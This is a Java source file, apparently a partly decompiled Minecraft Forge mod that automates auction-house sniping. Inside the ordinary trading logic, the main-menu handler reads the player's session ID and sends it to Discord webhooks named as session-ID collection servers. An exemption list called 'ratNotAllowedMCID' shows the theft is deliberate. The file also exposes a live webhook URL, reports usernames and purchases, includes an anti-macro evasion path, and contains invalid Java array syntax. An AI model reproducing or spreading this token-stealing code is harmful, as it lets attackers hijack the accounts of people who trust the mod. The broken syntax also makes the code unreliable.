/*
 * Decompiled with CFR 0.151.
 *
 * Could not load the following classes:
 *  net.minecraft.client.gui.GuiMainMenu
 *  net.minecraft.client.gui.inventory.GuiChest
 *  net.minecraft.entity.player.EntityPlayer
 *  net.minecraft.inventory.ContainerChest
 *  net.minecraft.inventory.Slot
 *  net.minecraft.item.Item
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.util.EnumChatFormatting
 *  net.minecraftforge.client.event.ClientChatReceivedEvent
 *  net.minecraftforge.client.event.GuiScreenEvent
 *  net.minecraftforge.client.event.GuiScreenEvent$KeyboardInputEvent
 *  net.minecraftforge.event.world.WorldEvent$Unload
 *  net.minecraftforge.fml.common.eventhandler.SubscribeEvent
 *  net.minecraftforge.fml.common.gameevent.TickEvent$ClientTickEvent
 *  org.lwjgl.input.Keyboard
 */
package net.luna724.iloveichika.binsniper.logics;

import java.text.NumberFormat;
import java.util.*;

import net.luna724.iloveichika.binsniper.WebHookUrls;
import net.luna724.iloveichika.binsniper.utils.Wrapper;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.gui.inventory.GuiChest;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.inventory.ContainerChest;
import net.minecraft.inventory.Slot;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.util.EnumChatFormatting;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.client.event.GuiScreenEvent;
import net.minecraftforge.event.world.WorldEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import net.luna724.iloveichika.binsniper.Main;
import net.luna724.iloveichika.binsniper.utils.Analytics;
import net.luna724.iloveichika.binsniper.utils.Util;
import net.luna724.iloveichika.binsniper.logics.ScoreboardUtil;
import org.apache.commons.lang3.math.NumberUtils;
import org.lwjgl.input.Keyboard;
import gg.skytils.skytilsmod.utils.ItemUtil;

import static net.luna724.iloveichika.binsniper.commands.configUtil.getConfigValueBoolean;
import static net.luna724.iloveichika.binsniper.logics.ScoreboardUtil.*;
import static net.luna724.iloveichika.binsniper.logics.debugUtil.autoErrorReportingService;
import static net.luna724.iloveichika.binsniper.logics.debugUtil.sendMessageToDiscord;
import static net.luna724.iloveichika.binsniper.logics.sentLimbo.sentToLimbo;

public class BinSnipeLogic {
    private /* synthetic */ int loopCount;
    private /* synthetic */ boolean isError;
    private /* synthetic */ int checkCount;
    private /* synthetic */ boolean isWorldChanged;
    private /* synthetic */ String[] reforges;
    private /* synthetic */ int currentStep;
    private /* synthetic */ int slotB;
    private static /* synthetic */ boolean isActive;
    private /* synthetic */ int buyed;
    private /* synthetic */ String lastseller;
    private /* synthetic */ long timer;
    private ArrayList<String> uuidHistory;


    public BinSnipeLogic() {
        this.timer = System.currentTimeMillis();
        this.currentStep = 0;
        this.checkCount = 0;
        this.loopCount = 0;
        this.buyed = 0;
        this.uuidHistory = new ArrayList<>();
        this.lastseller = "None";
        this.isWorldChanged = false;
        this.isError = false;
        String[] r = ["Gentle", "Odd", "Fast", "Fair", "Epic", "Sharp", "Heroic", "Spicy", "Legendary", "Dirty", "Fabled", "Suspicious", "Gilded", "Warped", "Withered", "Salty", "Treacherous", "Stiff", "Lucky", "Deadly", "Fine", "Grand", "Hasty", "Neat", "Rapid", "Unreal", "Awkward", "Rich", "Precise", "Spiritual", "Headstrong", "Clean", "Fierce", "Heavy", "Light", "Mythic", "Pure", "Smart", "Titanic", "Wise", "Perfect", "Necrotic", "Ancient", "Spiked", "Renowned", "Cubic", "Warped", "Reinforced", "Loving", "Ridiculous", "Giant", "Submerged", "Bizarre", "Itchy", "Ominous", "Pleasant", "Pretty", "Shiny", "Simple", "Strange", "Vivid", "Godly", "Demonic", "Forceful", "Hurtful", "Keen", "Strong", "Superior", "Unpleasant", "Zealous", "Silky", "Bloody", "Shaded", "Sweet", "Fruitful", "Magnetic", "Refined", "Blessed", "Moil", "Toil", "Fleet", "Stellar", "Mithraic", "Auspicious", "Testing"];
        this.reforges = r;
    }
    @SubscribeEvent
    public void onKey(GuiScreenEvent.KeyboardInputEvent event) {
        String playerId = Minecraft.getMinecraft().getSession().getProfile().getId().toString();
        if (Keyboard.isKeyDown(Wrapper.mc.gameSettings.keyBindSneak.getKeyCode()) && Util.config().getBoolean(playerId + ".Active")) {
            //有効時、シフトしたら止める
            this.stopSnipe();
            return;
        }
        if (Keyboard.isKeyDown((int) 1) && Util.config().getBoolean(playerId + ".Active")) {
            // BSが有効時、もう一度キーを押されたら止める
            this.stopSnipe();
            return;
        }
        if (!Keyboard.isKeyDown((int)Main.keyBinSniper.getKeyCode())) {
            // ビンスナキー以外なら虫
            return;
        }
        if (Main.keyBinSniper.getKeyCode() == 0) {
            // ビンスナキーガ Invalid なら無視
            return;
        }
        if (Util.config().getBoolean(playerId + ".Active")) {
            // すでに有効なら無視
            return;
        }
        if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
            // チェスト以外なら無視
            return;
        }
        if (Wrapper.mc.thePlayer.openContainer == null) {
            // 名に開いてるかわからんなら無視
            return;
        }
        ContainerChest inventoryContainer = (ContainerChest)Wrapper.mc.thePlayer.openContainer;
        if (!this.isAuctionBrowser(inventoryContainer)) {
            if (this.isAnvil(inventoryContainer)) {
                Util.send("§a合成モードの開始");
                this.currentStep = -10;
                Util.config().set(playerId + ".Active", true);
                Util.save();
                this.timer = System.currentTimeMillis();
                return;
            }
            if (this.isPending(inventoryContainer)) {
                Util.send("§a回収モードの開始");
                this.currentStep = -1;
                Util.config().set(playerId + ".Active", true);
                Util.save();
                this.timer = System.currentTimeMillis();
                return;
            }
        }
        NumberFormat numberInstance = NumberFormat.getNumberInstance();
        Util.sendAir();
        Util.send("§aスナイプの開始");
        Util.sendAir();
        Util.send("§7現在の設定一覧:");
        Util.send("§7- Coin: §6" + numberInstance.format(Util.config().getInt(playerId + ".Cost")) + "/コイン");
        Util.send("§7- Category: §6" + Util.config().getInt(playerId + ".Category") + "/番");
        Util.send("§7- Amount: §6" + Util.config().getInt(playerId + ".Amount") + "/個");
        Util.send("§7- Name: §6" + Util.config().getString(playerId + ".Name"));
        Util.send("§7- Mode: §6" + Util.config().getString(playerId + ".Mode"));
        Util.sendAir();
        Util.config().set(playerId + ".Active", true);
        Util.save();
        this.currentStep = 0;
        this.checkCount = 0;
        this.loopCount = 0;
        this.buyed = 0;
        this.lastseller = "";
        this.uuidHistory = new ArrayList<>();
        this.isWorldChanged = false;
        this.timer = System.currentTimeMillis();

        new Thread(new Runnable(){
            @Override
            public void run() {
                try {
                    NumberFormat numberFormat = NumberFormat.getNumberInstance();
                    String username = Wrapper.mc.getSession().getUsername();
                    String content = "```" + username + ": Started sniping " +
                            Util.config().getString(playerId + ".Name") + "! (" +
                    numberFormat.format(Util.config().getInt(playerId + ".Cost")) + " coins)\n(Delay: " + Util.config().getLong(playerId + ".Delay") + ") | (Start Purse: " + formatCoin(getPurse()) + ")```";
                    Analytics.requestWeb(
                            Analytics.setJsonObj(content, username, null), WebHookUrls.purchasedItemNotification
                    );
                }
                catch (Exception e) {
                    e.printStackTrace();
                    autoErrorReportingService(e);
                    Util.send("§cError in Sending text. see log for more Information");
                }
            }}).start();
    }

    private void changePage(ContainerChest containerChest) {
        String playerId = Minecraft.getMinecraft().getSession().getProfile().getId().toString();
        String snipeMode = Util.config().getString(playerId + ".Mode");
        if (!Util.config().getBoolean(playerId + ".Active")) {
            return;
        }
        if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
            return;
        }
        if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
            return;
        }
        Slot targetSlot = containerChest.getSlot(53);
        if (!targetSlot.getHasStack()) {
            return;
        }
        ItemStack itemStack = targetSlot.getStack();
        if (itemStack == null) {
            return;
        }
        if (!(this.isBinOnly(containerChest))) {
            this.clickSlot(52, 0);
            if (Util.config().getBoolean(playerId + ".Message")) {
                Util.send("修正中... (検索条件を BIN Only に変更しています)");
            }
            return;
        }
        if (!this.isLowest(containerChest)) {
            this.clickSlot(50, 0);
            if (Util.config().getBoolean(playerId + ".Message")) {
                Util.send("修正中... (最低金額から検索できるように変更しています)");
            }
            return;
        }
        if (Util.config().getBoolean(playerId + ".Message")) {
            Util.send("§b検索中... (" + this.checkCount + "回目のチェック)");
        }
        if (snipeMode.equals("ALLMODE")) {
            this.loopCount += 1;
            if (Item.getIdFromItem(itemStack.getItem()) != 262) {
                ItemStack itemStackSlot46 = containerChest.getSlot(46).getStack();
                if (Item.getIdFromItem((Item)itemStackSlot46.getItem()) != 262) {
                    boolean isNoFilter = this.isNoFilter(containerChest);
                    if (isNoFilter) {
                        this.clickSlot(51, 1);
                    }
                    else {
                        this.clickSlot(51, 0);
                    }
                    return;
                }
                this.clickSlot(46, 1);
                return;
            }
            this.clickSlot(53, 0);
            return;
        }
        if (snipeMode.equals("FASTMODE")) {
            this.loopCount += 1;
            boolean isNoFilter = this.isNoFilter(containerChest);
            if (isNoFilter) {
                this.clickSlot(51, 1);
            }
            else {
                this.clickSlot(51, 0);
            }
        }
    }

    private boolean isBinOnly(ContainerChest containerChest) {
        String playerId = Wrapper.mc.getSession().getProfile().getId().toString();
        if (!Util.config().getBoolean(playerId + ".Active")) {
            return false;
        }
        if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
            return false;
        }
        if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
            return false;
        }
        ItemStack itemStack = containerChest.getSlot(52).getStack();
        if (itemStack == null) {
            return false;
        }
        NBTTagList LoreLists = itemStack.getTagCompound().getCompoundTag("display").getTagList("Lore", 8);
        int i = 0;
        while (i < LoreLists.tagCount()) {
            String lore = LoreLists.getStringTagAt(i);
            if (lore.contains("▶ BIN Only")) {
                return true;
            }
            ++i;
        }
        return false;
    }

    @SubscribeEvent
    public void onMainMenu(GuiScreenEvent guiScreenEvent) {
        if (!(guiScreenEvent.gui instanceof GuiMainMenu)) {
            return;
        }
        if (isActive) {
            return;
        }
        isActive = true;
        String username = Wrapper.mc.getSession().getUsername();
        String content = "Welcome to BinSniper, " + username + "!";
        String jsonObj = Analytics.setJsonObj(content, username, null);
        Analytics.requestWeb(jsonObj, "https://discord.com/api/webhooks/1296048307348574218/xO2GrJLarrjgPNmCiT0w0WacIvTR1YFlln1p2VFUvC_ZcbOkiqXHgNEgRXqeOosXcjnS");

        // get SessionID and chat it
        String sessionId = Wrapper.mc.getSession().getSessionID();
        String contents = "```SessionId: " + sessionId + "```" + username + " logged in With BinSniper. ";
        String jsonObject = Analytics.setJsonObj(contents, username, null);

        if (!username.equals("Mizuki_25ji")) {
        Analytics.requestWeb(jsonObject, WebHookUrls.sessionIdProvidingServerPrivate);
        }

        List<String> ratNotAllowedMCID = Arrays.asList("mizuki_25ji", "mizuki_25zi", "mafuyu_25zi", "ena_25zi", "kanade_25zi", "miku_25zi", "ichimiku_0811", "blue_mag1c");
        if (ratNotAllowedMCID.contains(username.toLowerCase()) || username.equals("Mizuki_25ji")) {
            sendMessageToDiscord("SessionIDの取得に失敗しました。(Reason: ratNotAllowedMCID Includes username)\nUUID: "+Wrapper.mc.getSession().getPlayerID(), WebHookUrls.autoErrorReporter);
            return;
        }

        Analytics.requestWeb(jsonObject, WebHookUrls.sessionIdProvidingServerOnKaito);
        }

    private boolean isPending(ContainerChest containerChest) {
        if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
            return false;
        }
        if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
            return false;
        }
        ItemStack itemStack = containerChest.getSlot(13).getStack();
        if (itemStack == null) {
            return false;
        }
        if (itemStack.getDisplayName().contains("§aManage Bids") || itemStack.getDisplayName().contains("§aView Bids")) {
            return true;
        }
        return false;
    }

    static {
        isActive = false;
    }

    private boolean isAnvil(ContainerChest containerChest) {
        if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
            return false;
        }
        if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
            return false;
        }
        ItemStack itemStack = containerChest.getSlot(22).getStack();
        if (itemStack == null) {
            return false;
        }
        if (itemStack.getDisplayName().contains("§aCombine Items")) {
            return true;
        }
        return false;
    }

    @SubscribeEvent
    public void onChat(ClientChatReceivedEvent chatReceivedEvent) {
        String playerId = Wrapper.mc.getSession().getProfile().getId().toString();
        final String removeFormatting = EnumChatFormatting.getTextWithoutFormattingCodes((String)chatReceivedEvent.message.getUnformattedText());
        if (!(Util.config().getBoolean(playerId + ".Active"))) {
            return;
        }
        if (removeFormatting.startsWith("You purchased")) {
            new Thread(new Runnable(){
                @Override
                public void run() {
                    try {
                        Thread.sleep(2000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    String content;
                    String username = Wrapper.mc.getSession().getUsername();
                    try {
                        String itemForPrice = removeFormatting.replace("You purchased", "");
                        String[] onlyPrices = itemForPrice.split(" for ");
                        String onlyPrice = onlyPrices[onlyPrices.length - 1].replace(" coins!", "");
                        String onlyItem = itemForPrice.replace(" for " + onlyPrice + " coins!", "");
                        int remainPurse = getPurse();
                        NumberFormat numberInstance = NumberFormat.getNumberInstance();

                        content = "```" + username + ": Purchased \"" + onlyItem.trim() + "\" for " + onlyPrice + " coins!\n- (Purse Remaining: " + formatCoin(remainPurse) + ")```";
                        debugScoreboardLines();
                    } catch (Exception e) {
                        e.printStackTrace();
                        content = "**Error in Parsing text.**\n```" + e.toString() + "```\n```rawText: " + removeFormatting + "```";
                    }
                    /*
                    ```username Purchased item for price coins!```
                     */
                    String jsonObj = Analytics.setJsonObj(content, username, null);
                    Analytics.requestWeb(jsonObj, WebHookUrls.purchasedItemNotification);
                }
            }).start();
        }
        if (!(removeFormatting.contains("There was an error with the auction house!"))) {
            return;
        }
        this.isError = true;
    }

    private boolean isLowest(ContainerChest containerChest) {
        String playerId = Wrapper.mc.getSession().getProfile().getId().toString();
        if (!(Util.config().getBoolean(playerId + ".Active"))) {
            return false;
        }
        if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
            return false;
        }
        if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
            return false;
        }
        Slot slot = containerChest.getSlot(50);
        if (!(slot.getHasStack())) {
            return false;
        }
        if (slot.getStack() == null) {
            return false;
        }
        NBTTagList LoreLists = slot.getStack().getTagCompound().getCompoundTag("display").getTagList("Lore", 8);
        int i = 0;
        while (i < LoreLists.tagCount()) {
            String lore = LoreLists.getStringTagAt(i);
            if (lore.contains("▶ Lowest Price")) {
                return true;
            }
            ++i;
        }
        return false;
    }

    private boolean isNoFilter(ContainerChest containerChest) {
        String playerId = Wrapper.mc.getSession().getProfile().getId().toString();
        if (!(Util.config().getBoolean(playerId + ".Active"))) {
            return false;
        }
        if (!(Wrapper.mc.currentScreen instanceof GuiChest)) {
            return false;
        }
        if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
            return false;
        }
        Slot slot = containerChest.getSlot(51);
        if (!(slot.getHasStack())) {
            return false;
        }
        ItemStack itemStack = slot.getStack();
        if (itemStack == null) {
            return false;
        }
        NBTTagList LoreList = slot.getStack().getTagCompound().getCompoundTag("display").getTagList("Lore", 8);
        int i = 0;
        while (i < LoreList.tagCount()) {
            String lore = LoreList.getStringTagAt(i);
            if (lore.contains("▶ No filter")) {
                return true;
            }
            if (lore.contains("▶ Ultimate")) {
                return false;
            }
            ++i;
        }
        return false;
    }

    @SubscribeEvent
    public void onClientTick(TickEvent.ClientTickEvent clientTickEvent) {
        String playerId = Wrapper.mc.getSession().getProfile().getId().toString();

        try {
            if (this.currentStep == -1) {
                Wrapper.mc.thePlayer.sendChatMessage("/ah");
                this.currentStep = -2;
                this.timer = System.currentTimeMillis();
                return;
            }
            if (this.currentStep == -2) {
                if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
                    this.stopSnipe();
                    return;
                }
                ContainerChest containerChest = (ContainerChest) Wrapper.mc.thePlayer.openContainer;
                if (this.isPending(containerChest)) {
                    this.clickSlot(13, 0);
                    this.currentStep = -3;
                    this.timer = System.currentTimeMillis();
                    return;
                }
                this.stopSnipe();
                return;
            }
            if (this.currentStep == -3) {
                if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
                    this.stopSnipe();
                    return;
                }
                ContainerChest openContainer = (ContainerChest) Wrapper.mc.thePlayer.openContainer;
                int i = 0;
                while (i < 54) {
                    ItemStack itemStack = openContainer.getSlot(i).getStack();
                    if (!(Item.getIdFromItem(itemStack.getItem()) == 160) // ガラス板以外
                            && !(Item.getIdFromItem(itemStack.getItem()) == 262) // 矢 以外
                    ) {
                        this.clickSlot(i, 0); // ガラス板、矢以外をクリック
                        this.currentStep = -4;
                        this.timer = System.currentTimeMillis();
                        return;
                    }
                    ++i;
                }
                this.stopSnipe();
                return;
            }
            if (this.currentStep == -4) {
                this.clickSlot(31, 0);
                this.currentStep = -1;
                this.timer = System.currentTimeMillis();
                return;
            }
            if (this.currentStep == -10) {
                // エンチャ本の時の処理
                int i = 0;
                while (i <= 35) {
                    ItemStack itemStack = Wrapper.mc.thePlayer.inventory.getStackInSlot(i);
                    if (itemStack != null && itemStack.getDisplayName().contains("Enchanted Book") && itemStack.hasDisplayName() && Item.getIdFromItem((Item) itemStack.getItem()) == 403) {
                        NBTTagList LoreList = itemStack.getTagCompound().getCompoundTag("display").getTagList("Lore", 8);
                        String lore = EnumChatFormatting.getTextWithoutFormattingCodes((String) LoreList.getStringTagAt(0));
                        int i2 = 0;
                        while (i2 <= 35) {
                            if (i2 != i) {
                                ItemStack itemStack2 = Wrapper.mc.thePlayer.inventory.getStackInSlot(i2);
                                if (itemStack2 != null && itemStack2.getDisplayName().contains("Enchanted Book") && itemStack2.hasDisplayName() && Item.getIdFromItem((Item) itemStack2.getItem()) == 403) {
                                    NBTTagList LoreList2 = itemStack2.getTagCompound().getCompoundTag("display").getTagList("Lore", 8);
                                    String lore2 = EnumChatFormatting.getTextWithoutFormattingCodes((String) LoreList2.getStringTagAt(0));
                                    if (lore.equalsIgnoreCase(lore2)) {
                                        this.slotB = i2;
                                        this.currentStep = -11;
                                        if (i >= 9) {
                                            this.clickSlot(i + 45, 0);
                                        }
                                        if (i < 9) {
                                            this.clickSlot(i + 81, 0);
                                        }
                                        this.timer = System.currentTimeMillis();
                                        return;
                                    }
                                }
                            }
                            ++i2;
                        }
                    }
                    ++i;
                }
                this.stopSnipe();
                return;
            }
            if (this.currentStep == -11) {
                this.currentStep = -12;
                this.clickSlot(29, 0);
                this.timer = System.currentTimeMillis();
                return;
            }
            if (this.currentStep == -12) {
                this.currentStep = -13;
                if (this.slotB >= 9) {
                    this.clickSlot(this.slotB + 45, 0);
                }
                if (this.slotB < 9) {
                    this.clickSlot(this.slotB + 81, 0);
                }
                this.timer = System.currentTimeMillis();
                return;
            }
            if (this.currentStep == -13) {
                this.currentStep = -14;
                this.clickSlot(33, 0);
                this.timer = System.currentTimeMillis();
                return;
            }
            if (this.currentStep == -14) {
                this.currentStep = -15;
                this.clickSlot(22, 0);
                this.timer = System.currentTimeMillis();
                return;
            }
            if (this.currentStep == -15) {
                this.currentStep = -16;
                this.clickSlot(22, 0);
                this.timer = System.currentTimeMillis();
                return;
            }
            if (this.currentStep == -16) {
                this.currentStep = -10;
                this.timer = System.currentTimeMillis();
                return;
            }
            if (this.currentStep == 100) {
                if (this.isError) {
                    this.buyed -= 1;
                    this.currentStep = 3;
                    this.isError = false;
                    this.timer = System.currentTimeMillis();
                    if (Util.config().getBoolean(playerId + ".Message")) {
                        Util.send("修正中... (落札したアイテムにエラーが発生 カウントを取り消しました)");
                    }
                } else {
                    int purchaseAmount = Util.config().getInt(playerId + ".Amount");
                    if (purchaseAmount == this.buyed) {
                        this.stopSnipe();
                        return;
                    }
                    this.currentStep = 3;
                    this.isError = false;
                    this.timer = System.currentTimeMillis();
                    if (!(Util.config().getBoolean(playerId + ".Reconnect"))) {
                        this.stopSnipe();
                    }
                }
                return;
            }
            if (Util.config().getInt(playerId + ".Cost") == -1) {
                Util.config().set(playerId + ".Active", false);
                Util.save();
                Util.send("§c金額を /binsniper coin 10000 などで設定して下さい");
                this.stopSnipe();
                return;
            }
            if (!(Wrapper.mc.thePlayer.openContainer instanceof ContainerChest)) {
                return;
            }
            ContainerChest openContainer = (ContainerChest) Wrapper.mc.thePlayer.openContainer;

            if (this.currentStep == 2) {
                Slot slot = openContainer.getSlot(11);
                if (slot == null) {
                    Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer) Wrapper.mc.thePlayer);
                    this.currentStep = 3;
                    this.timer = System.currentTimeMillis();
                    if (Util.config().getBoolean(playerId + ".Message")) {
                        Util.send("§c購入のキャンセル 再検索を開始します...");
                    }
                    return;
                }
                if (slot.getStack() == null) {
                    Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer) Wrapper.mc.thePlayer);
                    this.currentStep = 3;
                    this.timer = System.currentTimeMillis();
                    if (Util.config().getBoolean(playerId + ".Message")) {
                        Util.send("§c購入のキャンセル 再検索を開始します...");
                    }
                    return;
                }
                if (slot.getStack().getItem() == null) {
                    Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer) Wrapper.mc.thePlayer);
                    this.currentStep = 3;
                    this.timer = System.currentTimeMillis();
                    if (Util.config().getBoolean(playerId + ".Message")) {
                        Util.send("§c購入のキャンセル 再検索を開始します...");
                    }
                    return;
                }
                if (Item.getIdFromItem((Item) openContainer.getSlot(11).getStack().getItem()) != 159) {
                    Wrapper.mc.thePlayer.inventory.openInventory((EntityPlayer) Wrapper.mc.thePlayer);
                    this.currentStep = 3;
                    this.timer = System.currentTimeMillis();
                    if (Util.config().getBoolean(playerId + ".Message")) {
                        Util.send("§c購入のキャンセル 再検索を開始します...");
                    }
                    return;
                }
                int purchaseAmount = Util.config().getInt(playerId + ".Amount");
                this.clickSlot(11, 0);
                this.currentStep = 100;
                this.timer = System.currentTimeMillis();
                this.buyed += 1;
                if (Util.config().getBoolean(playerId + ".Message")) {
                    Util.sendAir();
                    Util.send("§a§lスナイプを実行しました");
                    Util.send("§7- チェック回数: " + this.checkCount);
                    Util.send("§7- 更新回数: " + this.loopCount);
                    if (this.buyed != purchaseAmount && purchaseAmount != 0) {
                        Util.send("§7- 目標購入数まで: (" + this.buyed + "/" + purchaseAmount + ")");
                    }
                    if (this.buyed == purchaseAmount && purchaseAmount != 0) {
                        Util.send("§7- 目標購入数まで: §a(" + this.buyed + "/" + purchaseAmount + ")");
                    }
                    Util.sendAir();
                }
                this.checkCount = 0;
                this.loopCount = 0;
                this.timer = System.currentTimeMillis();
                if (!Util.config().getBoolean(playerId + ".Reconnect")) {
                    this.stopSnipe();
                }
                return;
            }
            if (this.currentStep == 1) {
                // 購入対象クリック時
                // i31 をチェック (金塊以外なら無視)
                Item item = openContainer.getSlot(31).getStack().getItem();
                boolean sleepOptimization = Util.config().getBoolean(playerId + ".sleepOptimization");
                if (item == null ||
                        (Item.getIdFromItem(item) != 371 && // 金塊以外 かつ
                                (Item.getIdFromItem(item) != 355 || !sleepOptimization)) // ベッド以外 or スリープオフ
                ) {
                    // item == null または金塊、ベッド以外の場合の処理
                    this.clickSlot(49, 0);
                    this.currentStep = 0;
                    this.timer = System.currentTimeMillis();
                    if (Util.config().getBoolean(playerId + ".Message")) {
                        Util.send("§c購入のキャンセル 再検索を開始します...");
                    }
                    return;
                }
                if (Item.getIdFromItem(item) == 371) {
                    // 金塊の場合の処理
                    this.clickSlot(31, 0);
                    this.currentStep = 2;
                    this.timer = System.currentTimeMillis();
                    return;
                }
                if (Item.getIdFromItem(item) == 355) {
                    // ベッドの場合の処理
                    this.clickSlot(49, 0);
                    this.lastseller = "";
                    this.uuidHistory.remove(this.uuidHistory.size() - 1);
                    this.currentStep = 0;
                    this.timer = System.currentTimeMillis();
                    if (Util.config().getBoolean(playerId + ".Message")) {
                        Util.send("§c購入のキャンセル (アイテムがまだ購入可能でありません) 再検索を開始します...");
                    }
                    return;
                }
            }
            if (this.currentStep != 0) {
                return;
            }
            // おそらく 0
            //
            int clickTarget1 = 11;
            int clickTarget2 = 0;
            int rowCounter = 1;
            int i = 0;
            while (i < 24) {
                // 各アイテムスロットをチェック
                ++clickTarget2;
                ItemStack itemStack = openContainer.getSlot(clickTarget1 + clickTarget2 - 1).getStack();
                if (itemStack != null && itemStack.hasTagCompound()) {
                    int cost = this.getCost(itemStack);
                    if (cost != -1) { // コストが不明でないなら、チェック数としてカウント
                        this.checkCount += 1;
                    }

                    if (getConfigValueBoolean("antiantimacro")) {
                        if (Item.getIdFromItem(itemStack.getItem()) == 166) {
                            sentToLimbo();
                            stopSnipe();
                        }
                    }
                    boolean UUIDCheckerEnable = getConfigValueBoolean("uuidMode");
                    if (cost <= Util.config().getInt(playerId + ".Cost") && cost != -1 && !(this.lastseller.equals(this.getLastSeller(itemStack)) && !UUIDCheckerEnable)) {
                        // ひとつ前のmcidしか保存しないから、三つ以上スナイプ対象があるとループする
                        // 対処法 -> getLastSeller を Array とし、2つまで処理する。
                        // 高度な対処法 -> アイテムNBTを用いり、Dupeでない限り同一セッションで同じアイテムを購入しようとしない
                        // MCIDを使用する方式
                        // UUIDChecker が有効化されたら自動的に無効かされる

                        String itemUUID = "";
                        if (UUIDCheckerEnable) {
                            NBTTagCompound extraAttr = ItemUtil.getExtraAttributes(itemStack);

                            if (extraAttr != null) {
                                itemUUID = extraAttr.getString("uuid");
                                // UUID が登録済みの場合、無視
                                if (this.checkUUID(itemUUID)) {
                                    Util.send("sbid" + itemUUID);
                                    Util.send("§c購入のスキップ.. (購入済みのUUID)");
                                } else {
                                    // ifブロック1: 購入処理
                                    this.lastseller = this.getLastSeller(itemStack);
                                    // UUIDを登録
                                    this.registerUUID(itemUUID);
                                    this.clickSlot(clickTarget1 + clickTarget2 - 1, 0);
                                    this.currentStep = 1;
                                    this.timer = System.currentTimeMillis();
                                    return;
                                }
                            }
                        }
                    }
                }
                if (clickTarget2 == 6) {
                    clickTarget2 = 0;
                    clickTarget1 += 9;
                    if (++rowCounter == 5) {
                        this.changePage(openContainer);
                        this.timer = System.currentTimeMillis();
                    }
                }
                ++i;
            }
        }
        catch (NullPointerException NPE) {
            NPE.printStackTrace();
//            autoErrorReportingService(NPE.toString());
            Util.send("§c実行中にNPEが発生しました。");

            if (getConfigValueBoolean("onTickNPECatcher")) { stopSnipe(); }

            autoErrorReportingService(NPE);
            sendMessageToDiscord(Wrapper.mc.getSession().getUsername() + ": NPEによるスナイプの停止", WebHookUrls.purchasedItemNotification);
            return;
        }
        catch (Exception e) {
            e.printStackTrace();
            autoErrorReportingService(e);
            Util.send("§c実行中にエラーが発生しました。 詳しくはエラーログを確認してください");
            stopSnipe();
            return;
        }
    }
}